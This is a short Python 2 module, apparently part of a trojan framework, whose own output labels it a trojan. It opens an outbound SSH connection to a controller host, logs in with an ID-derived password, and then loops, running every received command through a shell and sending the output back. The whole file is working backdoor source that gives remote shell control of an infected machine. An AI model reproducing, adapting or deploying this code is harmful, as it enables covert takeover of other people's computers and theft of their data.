#!/usr/bin/python

import threading
import paramiko
import subprocess
import sys
import traceback
import base64

def run(id, args):
    try:
        print "[->] In sshRcmd_client module."
        print "\t[*] Connecting to %s:%d" % (args['hostname'], args['port'])
        print "\t[*] Username: %s" % id
        print "\t[*] Password: %s" % base64.b64encode(id)
        
        client = paramiko.SSHClient()
        #client.load_host_keys('config/ssh_host_key')
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=args['hostname'],port=args['port'], username=id, password=base64.b64encode(id))
            ssh_session = client.get_transport().open_session()
        except:
            print "\t[!] Could not connect to client: %s:%d" % (args['hostname'], args['port']) 
            return None
        if ssh_session.active:
            print "\t[*] Client Connected"
            while True:
                try:
                    command = ssh_session.recv(1024) #get the command from the ssh server
                    if (command != 'exit'):
                        if (command == 'getid'):
                            ssh_session.send('Trojan ID: %s' % id)
                        else:
                            try:
                                cmd_output = subprocess.check_output(command, shell=True)
                                ssh_session.send(cmd_output)
                            except Exception, e:
                                ssh_session.send(str(e))
                    else:
                        print '\t[*] Session Closed'
                        client.close()
                        return None
                except Exception, e:
                    print '\t[-] Caught exception: ' + str(e)
                    try:
                        client.close()
                    except: 
                        pass
                    return None
        return None
    except:
        traceback.print_exc()
        return None